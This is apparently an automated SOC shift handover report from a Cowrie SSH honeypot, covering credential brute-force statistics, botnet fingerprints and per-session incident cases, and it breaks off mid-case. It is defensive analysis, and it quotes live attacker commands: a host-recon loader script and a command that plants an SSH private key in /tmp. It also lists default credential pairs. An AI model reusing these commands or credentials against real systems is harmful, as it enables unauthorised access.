# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-26 |
| **Generated At** | 2026-08-26T22:56:37Z |
| **Shift Time** | 22:56 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **87** |
| Confirmed Threats | **81** |
| False Positives Filtered | **6** (6.9%) |
| Unique Attacker IPs | **26** |
| Countries of Origin | **14** |
| High Severity Cases | **24** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **63** |
| Malware Samples Analyzed | **2** HIGH · **21** MED · 21 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **30** |
| Unique Credential Pairs | **25** |
| Unique Usernames | **4** |
| Unique Passwords | **12** |
| Successful Auth Pairs | **25** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 12 |
| `admin` | 10 |
| `test` | 6 |
| `support` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `` | 4 |
| `password` | 3 |
| `123456789` | 3 |
| `12345` | 3 |
| `12345678` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `` | 4 |
| `admin` | `admin` | 2 |
| `support` | `support` | 2 |
| `root` | `123456` | 1 |
| `root` | `password` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `admin` | `8.211.183.26` | 2026-08-26T18:55:57 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-26T18:55:57 |
| `support` | `support` | `10.0.0.73` | 2026-08-26T19:34:29 |
| `root` | `password` | `2.57.122.168` | 2026-08-26T19:35:51 |
| `root` | `123456789` | `2.57.122.168` | 2026-08-26T19:38:02 |
| `root` | `12345` | `2.57.122.168` | 2026-08-26T19:40:35 |
| `root` | `12345678` | `2.57.122.168` | 2026-08-26T19:42:24 |
| `root` | `qwerty` | `2.57.122.168` | 2026-08-26T19:44:16 |
| `root` | `123123` | `2.57.122.168` | 2026-08-26T19:45:34 |
| `root` | `111111` | `2.57.122.168` | 2026-08-26T19:46:59 |
| `admin` | `password` | `2.57.122.168` | 2026-08-26T19:48:37 |
| `admin` | `123456789` | `2.57.122.168` | 2026-08-26T19:50:20 |
| `admin` | `12345` | `2.57.122.168` | 2026-08-26T19:52:08 |
| `admin` | `12345678` | `2.57.122.168` | 2026-08-26T19:53:48 |
| `admin` | `qwerty` | `2.57.122.168` | 2026-08-26T19:55:31 |
| `admin` | `123123` | `2.57.122.168` | 2026-08-26T19:57:00 |
| `admin` | `111111` | `2.57.122.168` | 2026-08-26T19:59:20 |
| `admin` | `1234567` | `2.57.122.168` | 2026-08-26T20:00:41 |
| `test` | `123456` | `2.57.122.168` | 2026-08-26T20:02:36 |
| `test` | `password` | `2.57.122.168` | 2026-08-26T20:04:43 |
| `test` | `123456789` | `2.57.122.168` | 2026-08-26T20:06:50 |
| `test` | `12345` | `2.57.122.168` | 2026-08-26T20:08:51 |
| `test` | `12345678` | `2.57.122.168` | 2026-08-26T20:10:43 |
| `test` | `qwerty` | `2.57.122.168` | 2026-08-26T20:12:48 |
| `support` | `support` | `176.53.159.196` | 2026-08-26T20:35:24 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **87** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 30 |
| libssh | 12 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 22 | 1 |
| `4e066189c3bb...` | Generic scanner | 3 | 1 |
| `16443846184e...` | Generic scanner | 2 | 2 |
| `f1e5e9d24e5e...` | Mirai/variant | 2 | 1 |
| `19532158b559...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 22 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 5 | — |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `16443846184e...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **MEDIUM** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 21 | 1 | `T1082, T1592, T1078, T1083` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.168`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **26** |
| Unique ASNs | **19** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 3 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | HIGH |
| `AS11427` | Charter Communications Inc | 1 | HIGH |
| `AS6876` | TENET Scientific Production Enterprise LLC | 1 | LOW |
| `AS52363` | Jumpnet Soluciones de Internet S.R.L. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (24)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a42fb2772e8c

| Field | Detail |
|---|---|
| **Source IP** | `8.211.183[.]26` |
| **First Seen** | 2026-08-26 18:55 |
| **Last Seen** | 2026-08-26 18:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 18:55:56` | `cowrie.session.connect` |
| `2026-08-26 18:55:56` | `cowrie.client.version` |
| `2026-08-26 18:55:56` | `cowrie.client.kex` |
| `2026-08-26 18:55:57` | `cowrie.login.success` |
| `2026-08-26 18:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.211.183[.]26` to AbuseIPDB if not already reported
- [ ] Block `8.211.183[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-762f7b3a5eb1

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-26 18:55 |
| **Last Seen** | 2026-08-26 18:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 18:55:57` | `cowrie.session.connect` |
| `2026-08-26 18:55:57` | `cowrie.client.version` |
| `2026-08-26 18:55:57` | `cowrie.client.kex` |
| `2026-08-26 18:55:57` | `cowrie.login.success` |
| `2026-08-26 18:55:59` | `cowrie.session.params` |
| `2026-08-26 18:55:59` | `cowrie.command.input` |
| `2026-08-26 18:55:59` | `cowrie.session.file_download` |
| `2026-08-26 18:55:59` | `cowrie.session.file_download` |
| `2026-08-26 18:55:59` | `cowrie.log.closed` |
| `2026-08-26 18:56:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc5cb8d94764

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 19:35 |
| **Last Seen** | 2026-08-26 19:36 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 19:35:39` | `cowrie.session.connect` |
| `2026-08-26 19:35:41` | `cowrie.client.version` |
| `2026-08-26 19:35:41` | `cowrie.client.kex` |
| `2026-08-26 19:35:51` | `cowrie.login.success` |
| `2026-08-26 19:35:58` | `cowrie.session.params` |
| `2026-08-26 19:35:58` | `cowrie.command.input` |
| `2026-08-26 19:35:58` | `cowrie.command.input` |
| `2026-08-26 19:35:58` | `cowrie.command.input` |
| `2026-08-26 19:35:58` | `cowrie.command.input` |
| `2026-08-26 19:35:58` | `cowrie.command.input` |
| `2026-08-26 19:35:58` | `cowrie.command.success` |
| `2026-08-26 19:35:58` | `cowrie.command.input` |
| `2026-08-26 19:35:58` | `cowrie.command.input` |
| `2026-08-26 19:35:58` | `cowrie.command.input` |
| `2026-08-26 19:35:58` | `cowrie.command.input` |
| `2026-08-26 19:36:03` | `cowrie.log.closed` |
| `2026-08-26 19:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04100ca16787

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 19:37 |
| **Last Seen** | 2026-08-26 19:38 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 19:37:55` | `cowrie.session.connect` |
| `2026-08-26 19:37:56` | `cowrie.client.version` |
| `2026-08-26 19:37:56` | `cowrie.client.kex` |
| `2026-08-26 19:38:02` | `cowrie.login.success` |
| `2026-08-26 19:38:07` | `cowrie.session.params` |
| `2026-08-26 19:38:07` | `cowrie.command.input` |
| `2026-08-26 19:38:07` | `cowrie.command.input` |
| `2026-08-26 19:38:07` | `cowrie.command.input` |
| `2026-08-26 19:38:07` | `cowrie.command.input` |
| `2026-08-26 19:38:07` | `cowrie.command.input` |
| `2026-08-26 19:38:07` | `cowrie.command.success` |
| `2026-08-26 19:38:07` | `cowrie.command.input` |
| `2026-08-26 19:38:07` | `cowrie.command.input` |
| `2026-08-26 19:38:07` | `cowrie.command.input` |
| `2026-08-26 19:38:07` | `cowrie.command.input` |
| `2026-08-26 19:38:10` | `cowrie.log.closed` |
| `2026-08-26 19:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55e486c3ed56

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 19:40 |
| **Last Seen** | 2026-08-26 19:40 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 19:40:28` | `cowrie.session.connect` |
| `2026-08-26 19:40:28` | `cowrie.client.version` |
| `2026-08-26 19:40:28` | `cowrie.client.kex` |
| `2026-08-26 19:40:35` | `cowrie.login.success` |
| `2026-08-26 19:40:37` | `cowrie.session.params` |
| `2026-08-26 19:40:37` | `cowrie.command.input` |
| `2026-08-26 19:40:37` | `cowrie.command.input` |
| `2026-08-26 19:40:37` | `cowrie.command.input` |
| `2026-08-26 19:40:37` | `cowrie.command.input` |
| `2026-08-26 19:40:37` | `cowrie.command.input` |
| `2026-08-26 19:40:37` | `cowrie.command.success` |
| `2026-08-26 19:40:37` | `cowrie.command.input` |
| `2026-08-26 19:40:37` | `cowrie.command.input` |
| `2026-08-26 19:40:37` | `cowrie.command.input` |
| `2026-08-26 19:40:37` | `cowrie.command.input` |
| `2026-08-26 19:40:38` | `cowrie.log.closed` |
| `2026-08-26 19:40:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70d515581652

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 19:42 |
| **Last Seen** | 2026-08-26 19:42 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 19:42:07` | `cowrie.session.connect` |
| `2026-08-26 19:42:11` | `cowrie.client.version` |
| `2026-08-26 19:42:11` | `cowrie.client.kex` |
| `2026-08-26 19:42:24` | `cowrie.login.success` |
| `2026-08-26 19:42:31` | `cowrie.session.params` |
| `2026-08-26 19:42:31` | `cowrie.command.input` |
| `2026-08-26 19:42:31` | `cowrie.command.input` |
| `2026-08-26 19:42:31` | `cowrie.command.input` |
| `2026-08-26 19:42:31` | `cowrie.command.input` |
| `2026-08-26 19:42:31` | `cowrie.command.input` |
| `2026-08-26 19:42:31` | `cowrie.command.success` |
| `2026-08-26 19:42:31` | `cowrie.command.input` |
| `2026-08-26 19:42:31` | `cowrie.command.input` |
| `2026-08-26 19:42:31` | `cowrie.command.input` |
| `2026-08-26 19:42:31` | `cowrie.command.input` |
| `2026-08-26 19:42:34` | `cowrie.log.closed` |
| `2026-08-26 19:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f191449e551c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 19:44 |
| **Last Seen** | 2026-08-26 19:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 19:44:11` | `cowrie.session.connect` |
| `2026-08-26 19:44:13` | `cowrie.client.version` |
| `2026-08-26 19:44:13` | `cowrie.client.kex` |
| `2026-08-26 19:44:16` | `cowrie.login.success` |
| `2026-08-26 19:44:18` | `cowrie.session.params` |
| `2026-08-26 19:44:18` | `cowrie.command.input` |
| `2026-08-26 19:44:18` | `cowrie.command.input` |
| `2026-08-26 19:44:18` | `cowrie.command.input` |
| `2026-08-26 19:44:18` | `cowrie.command.input` |
| `2026-08-26 19:44:18` | `cowrie.command.input` |
| `2026-08-26 19:44:18` | `cowrie.command.success` |
| `2026-08-26 19:44:18` | `cowrie.command.input` |
| `2026-08-26 19:44:18` | `cowrie.command.input` |
| `2026-08-26 19:44:18` | `cowrie.command.input` |
| `2026-08-26 19:44:18` | `cowrie.command.input` |
| `2026-08-26 19:44:19` | `cowrie.log.closed` |
| `2026-08-26 19:44:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f4447eaf359

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 19:45 |
| **Last Seen** | 2026-08-26 19:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 19:45:28` | `cowrie.session.connect` |
| `2026-08-26 19:45:30` | `cowrie.client.version` |
| `2026-08-26 19:45:30` | `cowrie.client.kex` |
| `2026-08-26 19:45:34` | `cowrie.login.success` |
| `2026-08-26 19:45:37` | `cowrie.session.params` |
| `2026-08-26 19:45:37` | `cowrie.command.input` |
| `2026-08-26 19:45:37` | `cowrie.command.input` |
| `2026-08-26 19:45:37` | `cowrie.command.input` |
| `2026-08-26 19:45:37` | `cowrie.command.input` |
| `2026-08-26 19:45:37` | `cowrie.command.input` |
| `2026-08-26 19:45:37` | `cowrie.command.success` |
| `2026-08-26 19:45:37` | `cowrie.command.input` |
| `2026-08-26 19:45:37` | `cowrie.command.input` |
| `2026-08-26 19:45:37` | `cowrie.command.input` |
| `2026-08-26 19:45:37` | `cowrie.command.input` |
| `2026-08-26 19:45:37` | `cowrie.log.closed` |
| `2026-08-26 19:45:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5b075a1a26e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 19:46 |
| **Last Seen** | 2026-08-26 19:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 19:46:56` | `cowrie.session.connect` |
| `2026-08-26 19:46:57` | `cowrie.client.version` |
| `2026-08-26 19:46:57` | `cowrie.client.kex` |
| `2026-08-26 19:46:59` | `cowrie.login.success` |
| `2026-08-26 19:47:00` | `cowrie.session.params` |
| `2026-08-26 19:47:00` | `cowrie.command.input` |
| `2026-08-26 19:47:00` | `cowrie.command.input` |
| `2026-08-26 19:47:00` | `cowrie.command.input` |
| `2026-08-26 19:47:00` | `cowrie.command.input` |
| `2026-08-26 19:47:00` | `cowrie.command.input` |
| `2026-08-26 19:47:00` | `cowrie.command.success` |
| `2026-08-26 19:47:00` | `cowrie.command.input` |
| `2026-08-26 19:47:00` | `cowrie.command.input` |
| `2026-08-26 19:47:00` | `cowrie.command.input` |
| `2026-08-26 19:47:00` | `cowrie.command.input` |
| `2026-08-26 19:47:01` | `cowrie.log.closed` |
| `2026-08-26 19:47:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9ffe0dfc65a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 19:48 |
| **Last Seen** | 2026-08-26 19:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 19:48:31` | `cowrie.session.connect` |
| `2026-08-26 19:48:33` | `cowrie.client.version` |
| `2026-08-26 19:48:33` | `cowrie.client.kex` |
| `2026-08-26 19:48:37` | `cowrie.login.success` |
| `2026-08-26 19:48:40` | `cowrie.session.params` |
| `2026-08-26 19:48:40` | `cowrie.command.input` |
| `2026-08-26 19:48:40` | `cowrie.command.input` |
| `2026-08-26 19:48:40` | `cowrie.command.input` |
| `2026-08-26 19:48:40` | `cowrie.command.input` |
| `2026-08-26 19:48:40` | `cowrie.command.input` |
| `2026-08-26 19:48:40` | `cowrie.command.success` |
| `2026-08-26 19:48:40` | `cowrie.command.input` |
| `2026-08-26 19:48:40` | `cowrie.command.input` |
| `2026-08-26 19:48:40` | `cowrie.command.input` |
| `2026-08-26 19:48:40` | `cowrie.command.input` |
| `2026-08-26 19:48:41` | `cowrie.log.closed` |
